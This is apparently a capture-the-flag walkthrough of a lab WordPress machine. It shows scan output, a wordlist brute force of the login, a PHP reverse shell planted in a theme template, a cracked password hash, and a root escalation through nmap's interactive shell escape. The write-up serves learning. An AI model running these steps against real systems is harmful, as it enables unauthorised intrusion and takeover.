# Nmap

```shell
map scan report for 10.10.73.16
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```

## port 80

### Gobuster 

```shell
/blog                 (Status: 301) [Size: 232] [--> http://10.10.73.16/blog/]
/images               (Status: 301) [Size: 234] [--> http://10.10.73.16/images/]
/sitemap              (Status: 200) [Size: 0]                                   
/rss                  (Status: 301) [Size: 0] [--> http://10.10.73.16/feed/]    
/login                (Status: 302) [Size: 0] [--> http://10.10.73.16/wp-login.php]
/video                (Status: 301) [Size: 233] [--> http://10.10.73.16/video/]    
/0                    (Status: 301) [Size: 0] [--> http://10.10.73.16/0/]          
/feed                 (Status: 301) [Size: 0] [--> http://10.10.73.16/feed/]       
/image                (Status: 301) [Size: 0] [--> http://10.10.73.16/image/]      
/atom                 (Status: 301) [Size: 0] [--> http://10.10.73.16/feed/atom/]  
/wp-content           (Status: 301) [Size: 238] [--> http://10.10.73.16/wp-content/]
/admin                (Status: 301) [Size: 233] [--> http://10.10.73.16/admin/]     
/audio                (Status: 301) [Size: 233] [--> http://10.10.73.16/audio/]     
/intro                (Status: 200) [Size: 516314]                                  
/wp-login             (Status: 200) [Size: 2657]                                    
/css                  (Status: 301) [Size: 231] [--> http://10.10.73.16/css/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.73.16/feed/]        
/license              (Status: 200) [Size: 309]                                     
/wp-includes          (Status: 301) [Size: 239] [--> http://10.10.73.16/wp-includes/]
/js                   (Status: 301) [Size: 230] [--> http://10.10.73.16/js/]         
/Image                (Status: 301) [Size: 0] [--> http://10.10.73.16/Image/] 
```

Got *robot.txt* and found file name `fsocity.dic` which contains random words.

Going to `/wp-login.php` using *admin* as a name we get error for *username*

![image-20220530165750501](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220530165750501.png)

So brute forcing username from wordlist `fsocity.dic` and get the hit in username **elliot** and now brute forcing password from the same wordlist and found the password **ER28-0652**

### Reverse shell

Going to *appearance/editor* and changing the  404 Template with php reverse shell and running nc listener on your machine

![image-20220530171925512](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220530171925512.png)

Got the shell and the password hash for file *password.raw-md5* 

![image-20220530172955603](C:\Users\pro\AppData\Roaming\Typora\typora-user-images\image-20220530172955603.png)

after cracking the hash  `robot:abcdefghijklmnopqrstuvwxyz`

For privileges escalation used linpeas and found nmap can be exploited. Looking at GTFOBins 

```shell
nmap --interactive
nmap> !sh
```

and running the following commands privileges escalated to root.

